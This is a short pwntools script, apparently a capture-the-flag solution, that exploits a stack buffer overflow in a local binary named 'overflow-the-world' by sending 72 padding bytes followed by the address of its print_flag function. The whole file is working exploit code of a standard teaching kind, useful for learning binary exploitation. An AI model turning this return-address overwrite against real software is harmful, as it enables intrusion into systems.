#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./overflow-the-world")

r = process([exe.path])
# For debugging. Make sure to run `tmux` before running this 
# script with the following line uncommented
# gdb.attach(r)

flag = exe.symbols['print_flag']
r.recvuntil("What's your name? ")
payload = b'a'*72 + p64(flag)
r.sendline(payload)
r.recvline()    # receive one more line to only keep the flag

# Your exploit script goes here

r.interactive()
